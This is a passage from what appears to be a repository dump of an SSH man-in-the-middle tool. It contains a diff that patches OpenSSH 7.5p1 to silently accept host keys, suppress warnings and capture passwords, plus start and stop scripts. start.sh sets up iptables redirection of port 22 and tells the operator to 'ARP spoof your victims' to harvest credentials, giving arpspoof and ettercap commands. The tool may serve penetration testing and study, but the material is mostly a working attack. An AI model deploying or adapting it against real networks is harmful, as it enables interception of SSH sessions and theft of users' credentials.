\t\texplicit_bzero(response, strlen(response));\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect.c openssh-7.5p1-mitm/sshconnect.c\n--- openssh-7.5p1/sshconnect.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sshconnect.c\t2019-09-08 01:47:49.778198104 +0000\n@@ -64,6 +64,8 @@\n #include \"authfile.h\"\n #include \"ssherr.h\"\n #include \"authfd.h\"\n+#include \"digest.h\"\n+#include \"lol.h\"\n \n char *client_version_string = NULL;\n char *server_version_string = NULL;\n@@ -78,6 +80,8 @@\n extern char *__progname;\n extern uid_t original_real_uid;\n extern uid_t original_effective_uid;\n+extern int num_hostkey_fps;\n+extern hostkey_fp *server_hostkey_fps;\n \n static int show_other_keys(struct hostkeys *, Key *);\n static void warn_changed_key(Key *);\n@@ -916,10 +920,12 @@\n \t\t\t\t    \"address '%.128s' to the list of known \"\n \t\t\t\t    \"hosts (%.500s).\", type, ip,\n \t\t\t\t    user_hostfiles[0]);\n-\t\t\telse\n-\t\t\t\tlogit(\"Warning: Permanently added the %s host \"\n+\t\t\t/* Suppress the warning about adding this host key. */\n+\t\t\t/*else\n+\t\t\t  logit(\"Warning: Permanently added the %s host \"\n \t\t\t\t    \"key for IP address '%.128s' to the list \"\n-\t\t\t\t    \"of known hosts.\", type, ip);\n+\t\t\t\t    \"of known hosts.\", type, ip);*/\n+\n \t\t} else if (options.visual_host_key) {\n \t\t\tfp = sshkey_fingerprint(host_key,\n \t\t\t    options.fingerprint_hash, SSH_FP_DEFAULT);\n@@ -995,8 +1001,8 @@\n \t\t\t    msg2);\n \t\t\tfree(ra);\n \t\t\tfree(fp);\n-\t\t\tif (!confirm(msg))\n-\t\t\t\tgoto fail;\n+\t\t\t/*if (!confirm(msg))\n+\t\t\t  goto fail;*/\n \t\t\thostkey_trusted = 1; /* user explicitly confirmed */\n \t\t}\n \t\t/*\n@@ -1023,13 +1029,17 @@\n \t\t\t    host_key, options.hash_known_hosts);\n \t\t\thostp = host;\n \t\t}\n+\t\t/* Suppress compiler warning about hostp being set but not\n+\t\t * used. */\n+\t\tif (hostp) {}\n \n \t\tif (!r)\n \t\t\tlogit(\"Failed to add the host to the list of known \"\n \t\t\t    \"hosts (%.500s).\", user_hostfiles[0]);\n-\t\telse\n+\t\t/* Suppress the warning message about adding to known_hosts  */\n+\t\t/*else\n \t\t\tlogit(\"Warning: Permanently added '%.200s' (%s) to the \"\n-\t\t\t    \"list of known hosts.\", hostp, type);\n+\t\t\t\"list of known hosts.\", hostp, type);*/\n \t\tbreak;\n \tcase HOST_REVOKED:\n \t\terror(\"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\");\n@@ -1243,6 +1253,13 @@\n \tchar valid[64], *fp = NULL, *cafp = NULL;\n \tstruct sshkey *plain = NULL;\n \n+\t/* Add the host key's fingerprints to the array.  Both the old MD5 and new SHA256 fingerprints are stored. */\n+\tif ((server_hostkey_fps != NULL) && (num_hostkey_fps < MAX_SERVER_HOSTKEY_FPS)) {\n+\t  server_hostkey_fps[num_hostkey_fps].old = sshkey_fingerprint(host_key, SSH_DIGEST_MD5, SSH_FP_DEFAULT);\n+\t  server_hostkey_fps[num_hostkey_fps].new = sshkey_fingerprint(host_key, SSH_DIGEST_SHA256, SSH_FP_DEFAULT);\n+\t  num_hostkey_fps++;\n+\t}\n+\n \tif ((fp = sshkey_fingerprint(host_key,\n \t    options.fingerprint_hash, SSH_FP_DEFAULT)) == NULL) {\n \t\terror(\"%s: fingerprint host key: %s\", __func__, ssh_err(r));\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect.h openssh-7.5p1-mitm/sshconnect.h\n--- openssh-7.5p1/sshconnect.h\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sshconnect.h\t2019-09-08 01:47:49.778198104 +0000\n@@ -29,6 +29,7 @@\n \tKey\t**keys;\n \tint\tnkeys;\n \tint\texternal_keysign;\n+\tchar\t*password;\n };\n \n struct addrinfo;\n@@ -62,16 +63,20 @@\n  */\n #define PRIV_START do {\t\t\t\t\t\\\n \tint save_errno = errno;\t\t\t\t\\\n+\t/*\t\t\t\t\t\t\\\n \tif (seteuid(original_effective_uid) != 0)\t\\\n \t\tfatal(\"PRIV_START: seteuid: %s\",\t\\\n \t\t    strerror(errno));\t\t\t\\\n+\t*/\t\t\t\t\t\t\\\n \terrno = save_errno;\t\t\t\t\\\n } while (0)\n \n #define PRIV_END do {\t\t\t\t\t\\\n \tint save_errno = errno;\t\t\t\t\\\n+\t/*\t\t\t\t\t\t\\\n \tif (seteuid(original_real_uid) != 0)\t\t\\\n \t\tfatal(\"PRIV_END: seteuid: %s\",\t\t\\\n \t\t    strerror(errno));\t\t\t\\\n+\t*/\t\t\t\t\t\t\\\n \terrno = save_errno;\t\t\t\t\\\n } while (0)\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshd.c openssh-7.5p1-mitm/sshd.c\n--- openssh-7.5p1/sshd.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sshd.c\t2019-09-08 22:15:01.274627597 +0000\n@@ -72,6 +72,8 @@\n #include <string.h>\n #include <unistd.h>\n #include <limits.h>\n+#include <arpa/inet.h>\n+#include <linux/netfilter_ipv4.h>\n \n #ifdef WITH_OPENSSL\n #include <openssl/dh.h>\n@@ -122,6 +124,7 @@\n #include \"ssh-sandbox.h\"\n #include \"version.h\"\n #include \"ssherr.h\"\n+#include \"lol.h\"\n \n /* Re-exec fds */\n #define REEXEC_DEVCRYPTO_RESERVED_FD\t(STDERR_FILENO + 1)\n@@ -201,6 +204,9 @@\n \tint\thave_ssh2_key;\n } sensitive_data;\n \n+\n+Lol *lol = NULL;\n+\n /* This is set to true when a signal is received. */\n static volatile sig_atomic_t received_sighup = 0;\n static volatile sig_atomic_t received_sigterm = 0;\n@@ -543,10 +549,13 @@\n \t/* Demote the child */\n \tif (getuid() == 0 || geteuid() == 0) {\n \t\t/* Change our root directory */\n+/* chroot() won't work since we are not running as root. */\n+/*\n \t\tif (chroot(_PATH_PRIVSEP_CHROOT_DIR) == -1)\n \t\t\tfatal(\"chroot(\\\"%s\\\"): %s\", _PATH_PRIVSEP_CHROOT_DIR,\n \t\t\t    strerror(errno));\n-\t\tif (chdir(\"/\") == -1)\n+*/\n+\t\tif (chdir(MITM_ROOT) == -1)\n \t\t\tfatal(\"chdir(\\\"/\\\"): %s\", strerror(errno));\n \n \t\t/* Drop our privileges */\n@@ -672,6 +681,7 @@\n  skip:\n \t/* It is safe now to apply the key state */\n \tmonitor_apply_keystate(pmonitor);\n+\tmonitor_apply_lol(pmonitor, lol);\n \n \t/*\n \t * Tell the packet layer that authentication was successful, since\n@@ -1372,6 +1382,18 @@\n \tint keytype;\n \tAuthctxt *authctxt;\n \tstruct connection_info *connection_info = get_connection_info(0, 0);\n+#ifndef DEBUG_HOST\n+\tstruct sockaddr_in origaddr;\n+\tsocklen_t origaddr_len = sizeof(origaddr);\n+#endif\n+\n+\tlol = (Lol *)calloc(1, sizeof(Lol));\n+\n+        /* Terminate if sshd_mitm is running in a privileged account. */\n+        if ((getuid() < 500) || (getgid() < 500) || (geteuid() < 500) || (getegid() < 500)) {\n+            fprintf(stderr, \"Error: sshd_mitm must be run under a non-privileged account!  UID and GID must be >= 500.\\n\");\n+            exit(-1);\n+        }\n \n \tssh_malloc_init();\t/* must be called before any mallocs */\n \n@@ -1631,6 +1653,16 @@\n \t\texit(1);\n \t}\n \n+\tif (!rexeced_flag) {\n+#ifdef DEBUG_HOST\n+#define _STR(x) #x\n+#define STR(x) _STR(x)\n+\t\tchar mode[] = \"development mode: forcing connections to \" DEBUG_HOST \":\" STR(DEBUG_PORT);\n+#else\n+\t\tchar mode[] = \"production mode\";\n+#endif\n+\t\tlogit(\"SSH MITM \" SSH_MITM_VERSION \" starting (%s)\", mode);\n+\t}\n \tdebug(\"sshd version %s, %s\", SSH_VERSION,\n #ifdef WITH_OPENSSL\n \t    SSLeay_version(SSLEAY_VERSION)\n@@ -1780,7 +1812,8 @@\n \t\t    (st.st_uid != getuid () ||\n \t\t    (st.st_mode & (S_IWGRP|S_IWOTH)) != 0))\n #else\n-\t\tif (st.st_uid != 0 || (st.st_mode & (S_IWGRP|S_IWOTH)) != 0)\n+                /* Ownership of the chroot directory no longer relevant. */\n+                if (0)\n #endif\n \t\t\tfatal(\"%s must be owned by root and not group or \"\n \t\t\t    \"world-writable.\", _PATH_PRIVSEP_CHROOT_DIR);\n@@ -1956,6 +1989,17 @@\n \tsignal(SIGCHLD, SIG_DFL);\n \tsignal(SIGINT, SIG_DFL);\n \n+#ifndef DEBUG_HOST\n+\tif (getsockopt(sock_in, SOL_IP, SO_ORIGINAL_DST, (struct sockaddr *)&origaddr, &origaddr_len) != 0)\n+\t  fatal(\"%s: getsockopt failed.\", __func__);\n+\n+\tlol->original_host = strdup(inet_ntoa(origaddr.sin_addr));\n+\tlol->original_port = ntohs(origaddr.sin_port);\n+#else\n+\tlol->original_host = strdup(DEBUG_HOST);\n+\tlol->original_port = DEBUG_PORT;\n+#endif\n+\n \t/*\n \t * Register our connection.  This turns encryption off because we do\n \t * not have a key.\n@@ -2040,6 +2084,7 @@\n \t */\n \tif (use_privsep) {\n \t\tmm_send_keystate(pmonitor);\n+\t\tmm_send_lol(pmonitor, lol);\n \t\texit(0);\n \t}\n \ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshd_config openssh-7.5p1-mitm/sshd_config\n--- openssh-7.5p1/sshd_config\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sshd_config\t2019-09-08 01:47:49.778198104 +0000\n@@ -10,22 +10,24 @@\n # possible, but leave them commented.  Uncommented options override the\n # default value.\n \n-#Port 22\n+Port 2222\n #AddressFamily any\n #ListenAddress 0.0.0.0\n #ListenAddress ::\n \n-#HostKey /etc/ssh/ssh_host_rsa_key\n+HostKey /home/ssh-mitm/etc/ssh_host_rsa_key\n #HostKey /etc/ssh/ssh_host_dsa_key\n #HostKey /etc/ssh/ssh_host_ecdsa_key\n-#HostKey /etc/ssh/ssh_host_ed25519_key\n+HostKey /home/ssh-mitm/etc/ssh_host_ed25519_key\n+\n+PrintMotd no\n \n # Ciphers and keying\n #RekeyLimit default none\n \n # Logging\n-#SyslogFacility AUTH\n-#LogLevel INFO\n+SyslogFacility AUTH\n+LogLevel INFO\n \n # Authentication:\n \ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshlogin.c openssh-7.5p1-mitm/sshlogin.c\n--- openssh-7.5p1/sshlogin.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sshlogin.c\t2019-09-08 01:47:49.778198104 +0000\n@@ -113,7 +113,8 @@\n \t\telse\n \t\t\tsnprintf(buf, sizeof(buf), \"Last login: %s from %s\\r\\n\",\n \t\t\t    time_string, hostname);\n-\t\tbuffer_append(&loginmsg, buf, strlen(buf));\n+\t\t/* Suppress message about last login. */\n+\t\t/*buffer_append(&loginmsg, buf, strlen(buf));*/\n \t}\n # endif /* CUSTOM_SYS_AUTH_GET_LASTLOGIN_MSG */\n #endif /* NO_SSH_LASTLOG */\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/uidswap.c openssh-7.5p1-mitm/uidswap.c\n--- openssh-7.5p1/uidswap.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/uidswap.c\t2019-09-08 01:47:49.786197726 +0000\n@@ -59,6 +59,8 @@\n void\n temporarily_use_uid(struct passwd *pw)\n {\n+        /* Since we are never running as root, don't ever try to change uid/gid. */\n+\treturn;\n \t/* Save the current euid, and egroups. */\n #ifdef SAVED_IDS_WORK_WITH_SETEUID\n \tsaved_euid = geteuid();\n@@ -134,6 +136,8 @@\n void\n permanently_drop_suid(uid_t uid)\n {\n+        /* Since we are never running as root, don't ever try to change uid/gid. */\n+\treturn;\n #ifndef NO_UID_RESTORATION_TEST\n \tuid_t old_uid = getuid();\n #endif\n@@ -168,6 +172,8 @@\n void\n restore_uid(void)\n {\n+        /* Since we are never running as root, don't ever try to change uid/gid. */\n+\treturn;\n \t/* it's a no-op unless privileged */\n \tif (!privileged) {\n \t\tdebug(\"restore_uid: (unprivileged)\");\n@@ -205,6 +211,8 @@\n void\n permanently_set_uid(struct passwd *pw)\n {\n+        /* Since we are never running as root, don't ever try to change uid/gid. */\n+\treturn;\n #ifndef NO_UID_RESTORATION_TEST\n \tuid_t old_uid = getuid();\n \tgid_t old_gid = getgid();\n"
        },
        {
          "name": "openssh-7.5p1-mitm",
          "type": "tree",
          "content": null
        },
        {
          "name": "openssl-1.0.2u",
          "type": "tree",
          "content": null
        },
        {
          "name": "start.sh",
          "type": "blob",
          "size": 2.3876953125,
          "content": "#!/bin/bash\n\n# run.sh\n# Copyright (C) 2017  Joe Testa <jtesta@positronsecurity.com>\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms version 3 of the GNU General Public License as\n# published by the Free Software Foundation.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nif [[ `id -u` != 0 ]]; then\n    echo \"Error: this script must be run as root.\"\n    exit -1\nfi\n\n# Make sure sshd_mitm was correctly installed.\nif [[ (! -f /home/ssh-mitm/run.sh) || (! -f /home/ssh-mitm/bin/sshd_mitm) ]]; then\n    echo \"Error: could not find sshd_mitm.  You need to first run install.sh.\"\n    exit -1\nfi\n\necho \"Running sshd_mitm in unprivileged account...\"\nsu - ssh-mitm -c \"./run.sh\"\n\necho \"Enabling IP forwarding in kernel...\"\necho 1 > /proc/sys/net/ipv4/ip_forward\n\necho \"Changing FORWARD table default policy to ACCEPT...\"\niptables -P FORWARD ACCEPT\n\n# Check if the INPUT table has an ACCEPT for destination port 2222.  If not,\n# add it.\niptables -nL INPUT | egrep \"ACCEPT +tcp +-- +0\\.0\\.0\\.0/0 +0\\.0\\.0\\.0/0 +tcp dpt:2222\" > /dev/null\nif [[ $? != 0 ]]; then\n    echo \"Executing: iptables -A INPUT -p tcp --dport 2222 -j ACCEPT\"\n    iptables -A INPUT -p tcp --dport 2222 -j ACCEPT\nfi\n\n# Check if the PREROUTING table has a REDIRECT for port 22 to 2222.  If not,\n# add it.\niptables -t nat -nL PREROUTING | egrep \"REDIRECT +tcp +-- +0\\.0\\.0\\.0/0 +0\\.0\\.0\\.0/0 +tcp dpt:22 redir ports 2222\" > /dev/null\nif [[ $? != 0 ]]; then\n    echo \"Executing: iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222\"\n    iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222\nfi\n\necho -e \"\\n\\nDone!  Now ARP spoof your victims and watch /var/log/auth.log for credentials.  Logged sessions will be in /home/ssh-mitm/.  Hint: ARP spoofing can either be done with:\\n\\n\\tarpspoof -r -t 192.168.x.1 192.168.x.5\\n\\n\\t\\tOR\\n\\n\\tettercap -i enp0s3 -T -M arp /192.168.x.1// /192.168.x.5,192.168.x.6//\\n\\nIf you don't have a list of targets yet, run stop.sh and use JoesAwesomeSSHMITMVictimFinder.py to find them.  Then run this script again.\\n\"\nexit 0\n"
        },
        {
          "name": "stop.sh",
          "type": "blob",
          "size": 2.7685546875,
          "content": "#!/bin/bash\n\n# stop.sh\n# Copyright (C) 2017  Joe Testa <jtesta@positronsecurity.com>\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms version 3 of the GNU General Public License as\n# published by the Free Software Foundation.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nif [[ `id -u` != 0 ]]; then\n    echo \"Error: this script must be run as root.\"\n    exit -1\nfi\n\nif [[ (! -f /home/ssh-mitm/run.sh) || (! -f /home/ssh-mitm/bin/sshd_mitm) ]]; then\n    echo \"Error: could not find sshd_mitm.  You need to first run install.sh.\"\n    exit -1\nfi\n\n# Check if --force arg is present.\nFORCE=0\nif [[ ($# == 1) && ($1 == '--force') ]]; then\n    FORCE=1\nfi\n\n\n# If arpspoof or ettercap are running, stop.  Disabling the forwarding\n# configuration while still ARP spoofing would cause a denial of service...\nps ax | awk '{print $5}' | egrep 'arpspoof|ettercap' > /dev/null\nif [[ ($? == 0) && ($FORCE != 1) ]]; then\n   echo -e \"It looks like arpspoof or ettercap is still running.  You need to stop it before running this script, otherwise you'll cause a denial-of-service for the ARP targets.\\n\\nOtherwise, if you know what you're doing, re-run this script with '--force'.\"\n   exit -1\nelse\n   echo \"Forcing termination...\"\nfi\n\n# Kill all processes belonging to the ssh-mitm user.\nkillall -u ssh-mitm 2> /dev/null\n\necho \"Disabling IP forwarding in the kernel...\"\necho 0 > /proc/sys/net/ipv4/ip_forward\n\n# Check if the INPUT table has an ACCEPT for destination port 2222.  If so,\n# delete it.\niptables -nL INPUT | egrep \"ACCEPT +tcp +-- +0\\.0\\.0\\.0/0 +0\\.0\\.0\\.0/0 +tcp dpt:2222\" > /dev/null\nif [[ $? == 0 ]]; then\n    echo \"Executing: iptables -D INPUT -p tcp --dport 2222 -j ACCEPT\"\n    iptables -D INPUT -p tcp --dport 2222 -j ACCEPT\n    if [[ $? != 0 ]]; then\n        echo \"ERROR: failed to remove iptables rule!\"\n        exit -1\n    fi\nfi\n\n# Check if the PREROUTING table has a REDIRECT for port 22 to 2222.  If so,\n# delete it.\niptables -t nat -nL PREROUTING | egrep \"REDIRECT +tcp +-- +0\\.0\\.0\\.0/0 +0\\.0\\.0\\.0/0 +tcp dpt:22 redir ports 2222\" > /dev/null\nif [[ $? == 0 ]]; then\n    echo \"Executing: iptables -t nat -D PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222\"\n    iptables -t nat -D PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222\n    if [[ $? != 0 ]]; then\n        echo \"ERROR: failed to remove iptables rule!\"\n        exit -1\n    fi\nfi\n\necho -e \"\\nSuccessfully stopped sshd_mitm daemon and disabled forwarding rules.\\n\"\nexit 0\n"
        }
      ]
    }
  ]
}